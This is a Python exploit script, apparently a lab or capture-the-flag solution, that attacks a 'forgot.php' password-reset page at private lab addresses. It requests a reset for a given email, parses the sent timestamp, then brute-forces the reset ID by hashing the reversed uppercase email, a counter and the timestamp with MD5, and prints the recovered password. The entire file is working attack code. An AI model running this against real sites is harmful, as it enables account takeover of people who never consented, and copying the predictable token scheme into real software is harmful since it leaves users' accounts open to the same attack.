#!/usr/bin/env python3
import requests
import hashlib
from urllib.parse import quote_plus
from datetime import datetime as dt
from bs4 import BeautifulSoup


class Attack():
    def __init__(self, url='', email=''):
        self.url = url if url else 'http://10.102.9.11/forgot.php'
        self.email = email if email else '61qwfZ@secure-chat.co.uk'
        self.time = self.get_time()
        self.password = self.get_pass()

    def reset_pass(self):
        url = self.url + '?email=' + quote_plus(self.email)
        r = requests.get(url)
        if 'Invalid' not in r.text:
            return r.text
        else:
            print('Request failed')
            return (r.status_code, r.reason)

    def get_time(self):
        response = self.reset_pass()
        try:
            soup = BeautifulSoup(response, features='lxml')
            time_field = soup.select_one('div > small')
            fmt = 'Sent time: %H:%M:%S %d/%m/%Y'
            time = dt.strptime(time_field.text, fmt)
            return int(time.timestamp())
        except TypeError:
            print(response)
            exit()

    def gen_uid(self, num):
        email = self.email.upper()[::-1]
        uid = email + str(num) + str(self.time)
        uid = hashlib.md5(uid.encode('utf8')).hexdigest()
        return uid

    def get_pass(self, count=100):
        for i in range(count):
            uid = self.gen_uid(i)
            url = self.url + '?resetID=' + uid
            r = requests.get(url)
            if 'Invalid' not in r.text:
                print('Attempt: {}\tUID: {}'.format(i + 1, uid))
                soup = BeautifulSoup(r.text, features='lxml')
                pw = soup.select_one('div > b').text
                return pw

        return ''


if __name__ == '__main__':
    a = Attack(url='http://10.102.3.188/forgot.php')
    print(a.email, a.password)
